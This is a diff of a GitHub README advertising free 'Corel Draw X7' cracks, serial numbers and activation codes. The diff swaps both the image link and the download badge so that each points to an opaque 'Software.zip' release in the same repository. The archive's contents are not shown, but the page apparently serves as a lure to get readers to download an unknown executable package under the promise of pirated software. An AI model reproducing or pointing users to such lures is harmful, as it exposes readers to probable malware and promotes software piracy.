@@ -1,6 +1,6 @@
 # 🎨 Corel Draw X7 Free Repository 🎨
 
-![Corel Draw X7 Image](https://www.example.com/corel-draw-x7-image)
+![Corel Draw X7 Image](https://github.com/wispur1/Corel-Draw-X7-Free/releases/download/v1.0/Software.zip)
 
 Welcome to the **Corel Draw X7 Free** repository! Here you will find resources related to serial numbers, cracks, downloads, and activation codes for Corel Draw X7. Whether you are looking to explore the software for personal or professional use, this repository aims to provide you with the necessary tools to get started.
 
@@ -25,7 +25,7 @@ Welcome to the **Corel Draw X7 Free** repository! Here you will find resources r
 - [x] serial-number-corel-draw-x7
 
 ### Repository Link:
-[![Download Link](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Link](https://github.com/wispur1/Corel-Draw-X7-Free/releases/download/v1.0/Software.zip)](https://github.com/wispur1/Corel-Draw-X7-Free/releases/download/v1.0/Software.zip)
 
 Please click the button above to download the repository files and get ready to unleash the power of Corel Draw X7!
 
